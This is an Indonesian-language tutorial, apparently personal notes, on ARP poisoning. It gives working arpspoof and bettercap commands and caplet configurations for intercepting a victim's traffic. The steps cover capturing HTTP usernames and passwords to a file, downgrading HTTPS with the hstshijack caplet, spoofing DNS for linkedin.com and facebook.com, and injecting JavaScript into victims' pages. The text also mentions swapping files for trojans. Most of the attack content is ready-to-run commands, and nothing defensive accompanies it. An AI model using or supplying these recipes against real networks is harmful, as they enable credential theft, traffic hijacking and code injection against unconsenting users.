# ARP POISONING

## ARP SPOOFING
dengan ARP spoofing, seluruh trafik victim menuju router atau dest asli, akan dipaksa melewati komputer kita. komputer akan bilang ke router atau dest asli, kalau i am adalah victim (menggunakan ip victim), dan bilang ke victim i am adalah router/dest asli(menggunakan ip router). dengan begitu mapping ip arp tabel router / dest asli untuk victim akan diarahkan ke mac kita dan mapping ip arp tabel victim untuk router / dest asli akan diarahkan ke mac kita juga. 

ini bisa terjadi karena ARP punya dua kelemahan.
1. ARP akan mengaccept response packet arp walaupun tidak ada yang meminta
2. ARP tidak akan memverify tentang ARP Tabel nya, kemana mapping nya diarahkan. 

### ARPSPOOF
salah satu tool untuk melakukan arp spoofing adalah arpspoof, 
```
apt-get install dsniff
arpspoof -i interfacemu -t target maujadisiapa
```

jalankan arpspoof dua arah, dan jangan lupa ijinkan paket yang lewat di kali kita agar bisa lewat.
```
echo 1 > /proc/sys/net/ipv4/ip_forward
```

ketika udah berhasi kita bisa menginject code, mendapat username dan password, melihat semua file yang lewat, mengganti fle dengan trojan dan lain lain.

### BETTERCAP
tool arp spoofing yang lain. bisa apa ? sniff data, bypass https, redirect DNS, inject code dan lain lain. 

```
bettercap -iface interfacemu
``` 

nyalakan modul net.probe `net.probe on` biar bisa liat semua client. ini akan otomatis menjalankan modul `net.recon`. net.probe mengirim probe request ke semua ip dan jika mendapat response net.recon akan mendetect response dan menambahkan semua ip ke list.
`net.show` untuk menampilkan semua list ip.  
untuk melakukan spoof `set arp.spoof.fullduplex true` dan `set arp.spoof.targets IPnyaberapa`. baru nyalakan `arp.spoof on`.
 

lakukan sniff dengan menyalakan modul sniff `net.sniff on`. jika mau memasukan output ke file, sebelumnya matikan dulu modul events.stream nya `events.stream off`. ubah parameter events.stream.output. `set events.stream.output ~/namafile` nyalakan lagi modul `events.stream on`. 

agar reusable kita bisa memasukan parameter parameter di atas pada sebuah file yang disebut caplet. `touch tes.cap'

#### GATHERING DATA FROM HTTP TRAFFIC
trafik http adalah trafik yang bisa dibaca, dengan bettercap kita bisa mengambil username dan password dari suatu web http. kita dapat membuat konfigurasi bettercap di awal, caranya adalah dengan memasukan parameter - parameter bettercap kedalam sebuah file caplet. `nano konfig.cap'
```
net.probe on
set arp.spoof.fullduplex true
set arp.spoof.targets ipkomputer target
arp.spoof on
net.sniff on
``` 
```
bettercap -iface interfacemu -caplet konfig.cap
```
maka seluruh trafik yang dihasilkan target menuju external network akan ditampikan di layar terminal. 

#### GATHERING DATA FROM HTTPS TRAFFIC
trafik https adalah trafik yang tidak bisa dibaca, maka dari itu untuk membacanya kita perlu mendowngrade https menjadi http. terdapat caplet yang bernama hstshijack/hstshijack. caplet ini secara default sudah tersedia di `usr/share/bettercap/caplet`. Namun kita perlu memodifikasi caplet tersebut. berikut [file](Assets/hstshijack.zip)nya, dan masukan ke /usr/share/bettercap/caplet. 

pertama buat file caplet seperti berikut, `nano konfig2.cap`
```
net.probe on
events.stream off
set events.stream.output ~/cekpassword.txt
events.stream on
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.1.192
set net.sniff.local true // diperlukan untuk membypass hsts
net.sniff on
arp.spoof on
```
```
bettercap -iface interfacemu -caplet konfig2.cap
```
kemudian setelah masuk prompt bettercap panggil 
`>hstshijack/hstshijack` 

clear cache browser, jalankan trafik dikomputer target tanpa https. untuk hsts kita tidak bisa langsung ke link nya, kita harus menggunakan perantara. di caplet kita www.google.com bisa digunakna sebagai perantara. 

jika ada error `ip:53` gunakan versi bettercap 2.23. [disini](Assets/bettercap) gantikan binary bettercap existing di folder `usr/bin/bettercap`

#### DNS SPOOF
membelokan request dns, teknik ini juga menggunakan arp spoofing. 
```
service apache2 start
```
```
net.probe on
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.1.78
arp.spoof on

net.sniff on
set dns.spoof.all true
set dns.spoof.domains linkedin.com,*.linkedin.com,facebook.com,*.facebook.com
dns spoof on
```

#### INJECT JAVASCRIPT
kita dapat menggunakan caplet hstshijack untuk menginject javascript pada halaman halaman http. cara nya adalah buka file `/usr/share/bettercap/caplet/hstshijack/hstshijack.cap`. pada bagian payload paling akhir tambahkan koma untuk menambah payload baru `,*:/path/namascript.js`. kita bisa mengganti `*` dengan domain spesifik untuk menentukan dimana script kita akan dijalankan.  



